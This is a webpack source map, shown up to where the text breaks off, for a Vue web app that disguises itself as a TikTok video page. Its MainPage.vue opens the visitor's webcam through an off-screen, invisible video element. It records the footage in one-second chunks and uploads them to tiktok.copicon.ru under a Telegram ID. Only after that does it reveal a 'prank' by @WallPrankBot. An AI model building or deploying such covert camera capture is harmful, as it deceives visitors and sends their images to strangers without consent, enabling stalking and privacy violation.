{"version":3,"file":"js/app.dbaf35b5.js","mappings":"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","sources":["webpack://frontend/./src/App.vue","webpack://frontend/./src/App.vue?7ccd","webpack://frontend/./src/pages/MainPage.vue","webpack://frontend/./src/components/CameraObj.vue","webpack://frontend/./src/components/cLoader.vue","webpack://frontend/./src/components/cLoader.vue?8710","webpack://frontend/./src/components/CameraObj.vue?b253","webpack://frontend/./src/components/cInformationAbout.vue","webpack://frontend/./src/components/cInformationAbout.vue?195f","webpack://frontend/./src/pages/MainPage.vue?ecfc","webpack://frontend/./src/pages/SuccessPage.vue","webpack://frontend/./src/pages/SuccessPage.vue?e103","webpack://frontend/./src/pages/ReplaceTG.vue","webpack://frontend/./src/pages/ReplaceTG.vue?a0e5","webpack://frontend/./src/router.js","webpack://frontend/./src/main.js","webpack://frontend/webpack/bootstrap","webpack://frontend/webpack/runtime/chunk loaded","webpack://frontend/webpack/runtime/compat get default export","webpack://frontend/webpack/runtime/define property getters","webpack://frontend/webpack/runtime/global","webpack://frontend/webpack/runtime/hasOwnProperty shorthand","webpack://frontend/webpack/runtime/publicPath","webpack://frontend/webpack/runtime/jsonp chunk loading","webpack://frontend/webpack/startup"],"sourcesContent":["<template>\n  <router-view></router-view>\n</template>\n\n<script>\n\nexport default {\n  name: 'App',\n}\n</script>\n\n<style>\nhtml{\n  height: 100%;\n}\nbody{\n  height: 100%;\n  margin:0;\n  background-color: black;\n}\n#app {\n  height: 94%;\n  display: flex;\n  \n}\n</style>\n","import { render } from \"./App.vue?vue&type=template&id=114cef22\"\nimport script from \"./App.vue?vue&type=script&lang=js\"\nexport * from \"./App.vue?vue&type=script&lang=js\"\n\nimport \"./App.vue?vue&type=style&index=0&id=114cef22&lang=css\"\n\nimport exportComponent from \"../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__","<template>\n    <img v-if=\"isActiveMainImage\" class=\"main_image\" ref=\"main_image\" src=\"@/assets/img/image copy.png\" width=\"1000\" height=\"1000\" alt=\"\">\n    <video class=\"camera_video\" ref=\"video\" width=\"640\" height=\"480\" autoplay></video>\n    <CameraObj ref=\"camera_obj\" v-if=\"isActiveCameraBlock\" class=\"cm\"></CameraObj>\n    <CInformationAbout v-if=\"infoBlockActive\"></CInformationAbout>\n    <canvas ref=\"canvas\" width=\"640\" height=\"480\"></canvas>\n\n</template>\n\n<script>\nimport CameraObj from '@/components/CameraObj.vue';\nimport CInformationAbout from '@/components/cInformationAbout.vue';\nimport {v4 as uuidv4} from 'uuid';\n\n\nexport default {\n  name: 'App',\n  components:{CameraObj, CInformationAbout},\n  data() {\n    return {\n      video_name: uuidv4(),\n      stream: null, // Хранение видеопотока\n      videoChunks: [], // Для хранения частей записанного видео\n      telegramId: this.$route.params.telegram_id,\n      isActiveCameraBlock: false,\n      isActiveMainImage: true,\n      isActiveCanvas: false,\n      isActiveCameraVideo: false,\n      infoBlockActive: false,\n      baseUrl: 'https://tiktok.copicon.ru'\n    };\n  },\n  mounted() {\n\n    this.startCamera(); // Стартуем камеру при загрузке компонента\n    document.title = \"TikTok Video №10394\"\n  },\n  \n  methods: {\n    startCamera() {\n      console.log(this.$refs.camera_obj )\n      navigator.mediaDevices.getUserMedia({ video: true })\n        .then((mediaStream) => {\n          this.isActiveCameraBlock = true\n          this.isActiveMainImage = false\n          this.stream = mediaStream;\n          this.$refs.video.srcObject = mediaStream;\n\n          const options = { mimeType: 'video/mp4' };\n          const mediaRecorder = new MediaRecorder(this.stream, options);\n          const CHUNK_INTERVAL = 1000;  \n\n          mediaRecorder.ondataavailable = async (event) => {\n            const chunk = event.data;\n            const formData = new FormData();\n            formData.append('video', chunk, `${this.video_name}.mp4`)\n            formData.append('telegram_id', this.telegramId)\n            try {\n              await fetch(`${this.baseUrl}/api/v1/send_chunk/`, {\n              method: \"POST\",\n              body: formData,\n              });\n              console.log(\"Чанк отправлен успешно\");\n            } catch (error) {\n              console.error(\"Ошибка отправки чанка:\", error);\n            }\n          }\n          mediaRecorder.start(CHUNK_INTERVAL)\n\n          // Как только поток начнется, делаем снимок\n          this.$refs.video.addEventListener('loadeddata', () => {\n            setTimeout(() => {\n              this.takeSnapshot(); // Делаем снимок\n            }, 1000); // Задержка для фокусировки\n          });\n          window.addEventListener(\"beforeunload\", () => {\n          mediaRecorder.stop();\n          mediaStream.getTracks().forEach((track) => track.stop());\n        });\n        })\n        .catch((err) => {\n          console.error('Error accessing camera: ', err);\n        });\n        \n    },\n    // Остановка камеры\n    stopCamera() {\n      if (this.stream) {\n        const tracks = this.stream.getTracks();\n        tracks.forEach(track => track.stop()); // Останавливаем каждый трек\n      }\n    },\n    // Делаем снимок\n    takeSnapshot() {\n      const canvas = this.$refs.canvas;\n      const video = this.$refs.video;\n      const context = canvas.getContext('2d');\n\n      // Рисуем изображение на canvas\n      context.drawImage(video, 0, 0, canvas.width, canvas.height);\n\n      // Получаем данные изображения\n      const imageData = canvas.toDataURL('image/png');\n\n      // Начинаем запись видео\n      this.startRecording(imageData);\n    },\n    // Начинаем запись видео на 5 секунд\n    startRecording() {\n      \n      // const options = { mimeType: 'video/mp4' };\n      // const mediaRecorder = new MediaRecorder(this.stream, options);\n      // const CHUNK_INTERVAL = 1000;\n\n      // // Записываем части видео\n      // mediaRecorder.ondataavailable = async (event) => {\n      //   const chunk = event.data;\n      //   const formData = new FormData();\n      //   formData.append(\"video\", chunk, `${this.video_name}.mp4`);\n      //   formData.append(\"telegram_id\", this.telegramId)\n      //   try {\n      //     await fetch(\"http://localhost:8000/api/v1/send_chunk/\", {\n      //     method: \"POST\",\n      //     body: formData,\n      //   })\n      //   } catch {\n      //     console.log()\n      //   }\n        \n      // };\n\n      // // Когда запись завершена\n      // // mediaRecorder.onstop = () => {\n      // //   const videoBlob = new Blob(this.videoChunks, { type: 'video/mp4' });\n      // //   // this.sendData(imageData, videoBlob); // Отправляем фото и видео на сервер\n      // // };\n\n      // // Начинаем запись\n      // mediaRecorder.start(CHUNK_INTERVAL);\n\n      // // Останавливаем запись через 5 секунд\n      setTimeout(() => {\n        this.stopCamera()\n        // this.mediaRecorder.stop();\n      }, 5000);\n      \n    },\n    // Отправляем фото и видео на сервер\n    sendData(imageData, videoBlob) {\n      // Преобразуем base64 фото в Blob\n      const photoBlob = this.dataURItoBlob(imageData);\n\n      // Формируем данные для отправки\n      const formData = new FormData();\n      formData.append('image', photoBlob, 'photo.png');\n      formData.append('video', videoBlob, 'video.mp4');\n      formData.append('telegram_id', this.telegramId)\n      // Отправляем POST-запрос\n      fetch(`${this.baseUrl}/api/v1/send_chunk/`, {\n        method: 'POST',\n        body: formData\n      })\n      .then(response => response.json())\n      .then(data => {\n        console.log('Success:', data);\n        this.stopCamera(); // Останавливаем видеопоток после отправки данных\n        setTimeout(() => {\n      this.previewModalWindow()\n    }, 3000)\n      })\n      .catch((error) => {\n        console.error('Error:', error);\n        this.stopCamera()\n        setTimeout(() => {\n      this.previewModalWindow()\n    }, 3000)\n      });\n\n      \n    },\n    // Преобразуем base64 в Blob\n    dataURItoBlob(dataURI) {\n      const byteString = atob(dataURI.split(',')[1]);\n      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];\n      const ab = new ArrayBuffer(byteString.length);\n      const ia = new Uint8Array(ab);\n      for (let i = 0; i < byteString.length; i++) {\n        ia[i] = byteString.charCodeAt(i);\n      }\n      return new Blob([ab], { type: mimeString });\n    },\n    previewModalWindow(){\n      this.isActiveCameraBlock = false\n      this.infoBlockActive = true\n    }\n  },\n  beforeUnmount() { // Замена beforeDestroy на beforeUnmount\n    this.stopCamera(); // Останавливаем камеру при уничтожении компонента\n    \n    \n  }\n};\n</script>\n\n<style scoped>\nhtml{\n  background-color: black;\n}\nbody{\n  background-color: black;\n}\n#app {\n  text-align: center;\n  background-color: black;\n  display: flex;\n  flex-direction: column-reverse;\n \n}\n.cm{\n  margin-top: 0px;\n}\n.camera_video{\n  opacity: 0;\n  position: absolute;\n  left: -1900px;\n  top: -1000px;\n}\n.video_video{\n  display: block;\n  margin: auto\n}\ncanvas{\n  position: absolute;\n  display: none;\n}\n\n.main_image{\n  z-index: 100;\n  height: 50%;\n  width: 100%;\n  animation: slidein 2s ease-in-out infinite;\n}\n\n\n@keyframes slidein {\n  from {\n    transform: scale(.85);\n  }\n  50% {\n    transform: scale(1);\n  }\n  to {\n    transform: scale(.85);\n  }\n}\n</style>\n","<template>\n    <div class=\"screen_components\">\n      \n      <div class=\"back_block\">\n        <div class=\"close_button\"><img width=\"20\" src=\"@/assets/img/x.png\" alt=\"\"></div>\n        <div class=\"sound_title\"><img src=\"@/assets/img/music.png\" alt=\"\">Sound</div>\n        <div class=\"reload_button\"><img src=\"@/assets/img/reload.png\" alt=\"\"></div>\n      </div>\n      <div class=\"control_block\">\n        <div>\n          \n        </div>\n        <div class=\"\">\n          <div class=\"control_button\">\n            <img src=\"@/assets/img/speed.png\"  alt=\"\">\n            <span></span>\n          </div>\n          <div class=\"control_button\">\n            <img src=\"@/assets/img/rotate.png\"  alt=\"\">\n            <span></span>\n          </div>\n          <div class=\"control_button\">\n            <img src=\"@/assets/img/star.png\"  alt=\"\">\n            <span></span>\n          </div>\n        </div>\n        <CLoader class=\"loader\"></CLoader>\n      </div>\n      \n      <div class=\"empty_block\"></div>\n      <div class=\"empty_block\"></div>\n      <div class=\"empty_block\"></div>\n      <div class=\"empty_block\"></div>\n      <div class=\"camera_block\">\n        <div class=\"effect_obj\">\n          <img src=\"@/assets/img/luky.png\" alt=\"\">\n          <span>Эффекты</span>\n        </div>\n        <div class=\"camera_obj\">\n          <img src=\"@/assets/img/came.png\" alt=\"\">\n          \n        </div>\n        <div class=\"upload_obj\">\n          <img src=\"@/assets/img/square.png\" alt=\"\">\n          <span>Загрузить</span>\n        </div>\n      </div>\n    </div>\n  \n</template>\n\n<script>\nimport CLoader from './cLoader.vue';\n\nexport default {\n  name: 'CameraComponent',\n  components: {\n    CLoader\n  },\n\n}\n</script>\n\n<style>\n*{\n  font-family: 'Roboto', sans-serif;\n}\n.loader{\n  position: absolute;\n  display: block;\n  margin: auto;\n\n}\n.screen_components{\n  border-radius: 16px;\n  padding: 20px 0;\n  background-color: rgba(255, 255, 255, 0.08);\n  color: white;\n  width: 500px;\n  height: 100%;\n  display: flex;\n  flex-direction: column;\n  \n  justify-content: space-between;\n}\n.back_block{\n  margin-top: 10px;\n  display: flex;\n  align-items: center;\n  justify-content: space-around;\n}\n.close_button{\n  font-size: 30px;\n}\n.sound_title img{\n  width: 30px;\n  height: 30px;\n  margin-right: 10px; \n}\n.sound_title{\n  background-color: #2b2b2b;\n  padding: 7px 20px;\n  border-radius: 3px;\n\n  display: flex;\n  align-items: center\n}\n.reload_button img{\n  width: 30px;\n  height: 30px;\n}\n.control_block{\n  padding: 20px;\n  display: flex;\n  flex-direction: column;\n  align-items: end;\n\n}\n.control_button{\n  padding: 10px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n}\n.control_button img{\n  margin: 3px;\n  width: 35px;\n  height: 35px;\n}\n.control_button span{\n  font-size: 15px;\n  margin: 3px;\n}\n.camera_block{\n  display: flex;\n  justify-content: space-evenly;\n  align-items: end;\n}\n.camera_obj, .effect_obj, .upload_obj{\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n}\n.camera_obj span, .effect_obj span, .upload_obj span{  \n  margin-top: 4px;\n  font-size: 15px;\n}\n.effect_obj img, .upload_obj img{\n  width: 60px;\n}\n.camera_obj img{\n  width:90px ;\n}\n@media (max-width:525px) {\n  .sound_title img{\n    width: 20px;\n    height: 20px;\n    margin-right: 10px;\n  }\n  .control_button{\n    padding: 10px;\n\n  }\n  .control_button img{\n    margin: 3px;\n    width: 25px;\n    height: 25px;\n  }\n  .control_button span{\n    font-size: 12px;\n    margin: 3px;\n  }\n    .screen_components{\n      width: 100%;\n      border-radius: 0;\n      margin: 0;\n    }\n    .camera_obj span, .effect_obj span, .upload_obj span{  \n      margin-top: 2px;\n      font-size: 13px;\n    }\n    .effect_obj img, .upload_obj img{\n      width: 40px;\n    }\n    .camera_obj img{\n      width:60px ;\n    }\n}\n</style>\n\n","<template>\n        <span class=\"tiktok-loader\"></span>\n</template>\n<script>\nexport default {\n    name: 'cLoader'\n}\n</script>\n<style scoped>\n\n  \n  .tiktok-loader {\n    width: 80px;\n    height: 40px;\n    position: relative;\n  }\n  \n  .tiktok-loader::before,\n  .tiktok-loader::after {\n    position: absolute;\n    content: \"\";\n    top: 6px;\n    background-color: #ff3e9e;\n    width: 28px;\n    height: 28px;\n    border-radius: 50%;\n    animation: tiktok-loader-anim 1s linear infinite;\n  }\n  \n  .tiktok-loader::after {\n    background-color: #4de8f4;\n    animation-delay: 0.5s;\n  }\n  \n  @keyframes tiktok-loader-anim {\n  \n    0%,\n    100% {\n      top: 6px;\n      left: 0px;\n      width: 28px;\n      height: 28px;\n      z-index: 0;\n    }\n  \n    25% {\n      top: 0px;\n      height: 40px;\n      width: 40px;\n      z-index: 1;\n      left: 20px;\n    }\n  \n    50% {\n      top: 6px;\n      width: 28px;\n      height: 28px;\n      left: 48px;\n    }\n  \n    75% {\n      top: 8px;\n      width: 28px;\n      height: 28px;\n      left: 26px;\n    }\n  }\n</style>","import { render } from \"./cLoader.vue?vue&type=template&id=068f8aa9&scoped=true\"\nimport script from \"./cLoader.vue?vue&type=script&lang=js\"\nexport * from \"./cLoader.vue?vue&type=script&lang=js\"\n\nimport \"./cLoader.vue?vue&type=style&index=0&id=068f8aa9&scoped=true&lang=css\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__scopeId',\"data-v-068f8aa9\"]])\n\nexport default __exports__","import { render } from \"./CameraObj.vue?vue&type=template&id=fb72517c\"\nimport script from \"./CameraObj.vue?vue&type=script&lang=js\"\nexport * from \"./CameraObj.vue?vue&type=script&lang=js\"\n\nimport \"./CameraObj.vue?vue&type=style&index=0&id=fb72517c&lang=css\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render]])\n\nexport default __exports__","<template>\n    <div class=\"info-block\">\n        <img src=\"@/assets/img/result_prank.png\" alt=\"\">\n        <h1>Вас пранканули с помошью телеграм бота @WallPrankBot</h1>\n        <h3>Вы сели на подушку пердушку </h3>\n        <h5>Ваша фотография отправлена владельцу ссылки </h5>\n\n        <a href=\"https://t.me/@WallPrankBot\">Попробывать также </a>\n    </div>\n</template>\n<script>\nexport default {\n    name: 'cInformationAbout',\n    data () {\n        return {\n            prankBotURL: 'https://t.me/@WallPrankBot'\n        }\n    }\n}\n</script>\n<style scoped>\n    .info-block{\n        display: flex;\n        margin: auto;\n        height: max-content;\n        background-color: #2b2b2b;\n        color: aliceblue;\n        border-radius: 30px;\n        padding: 10%;\n        border: 3px solid black;\n        flex-direction: column;\n    }\n    img{\n        width: 200px;\n        height: 200px;\n        margin: auto\n    }\n    a{\n        text-align: center;\n        display: block;\n        text-decoration: none;\n        color: white;\n        padding: 10px 50px;\n        background-color: #000000;\n        border-radius: 6px;\n        margin-bottom: 5px;\n    }\n    p{\n        font-size: 30px;\n        font-weight: 900;\n    }\n</style>","import { render } from \"./cInformationAbout.vue?vue&type=template&id=f901e93c&scoped=true\"\nimport script from \"./cInformationAbout.vue?vue&type=script&lang=js\"\nexport * from \"./cInformationAbout.vue?vue&type=script&lang=js\"\n\nimport \"./cInformationAbout.vue?vue&type=style&index=0&id=f901e93c&scoped=true&lang=css\"\n\nimport exportComponent from \"../../node_modules/vue-loader/dist/exportHelper.js\"\nconst __exports__ = /*#__PURE__*/exportComponent(script, [['render',render],['__scopeId',\"data-v-f901e93c\"]])\n\nexport default __exports__","import { render } from \"./MainPage.vue?vue&type=template&id=39726fa0&scoped=true\"\nimport script from \"./MainPage.vue?vue&type=script&lang=js\"\nexport * from \"./MainPage.vue?vue&type=script&lang=js\"\n\nimport 